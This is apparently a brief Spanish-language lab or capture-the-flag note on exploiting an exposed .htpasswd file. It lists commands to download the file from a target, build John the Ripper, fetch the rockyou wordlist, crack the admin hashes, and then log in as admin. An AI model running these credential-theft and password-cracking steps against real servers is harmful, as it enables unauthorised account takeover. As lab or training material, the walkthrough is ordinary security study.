# Explotación archivo htpasswd
Exfiltrado por robots.txt, archivo htpasswd.
.htpasswd, credenciales de apache que por algun motivo se encuentran aqui.
(definicion htpasswd)

Lanzamos un john.

```
apt update && apt install -y git build-essential libssl-dev zlib1g-dev yasm

git clone https://github.com/openwall/john -b bleeding-jumbo john-jumbo
cd john-jumbo/src
./configure && make -s clean && make -sj$(nproc)

curl http://<ip>/whatever/httpaswd -o htpasswd
curl https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt

./john --format=raw-md5 --wordlist=rockyou.txt ./htpasswd

```

Son credenciales de admin, pues nos intentamos loggear como admin.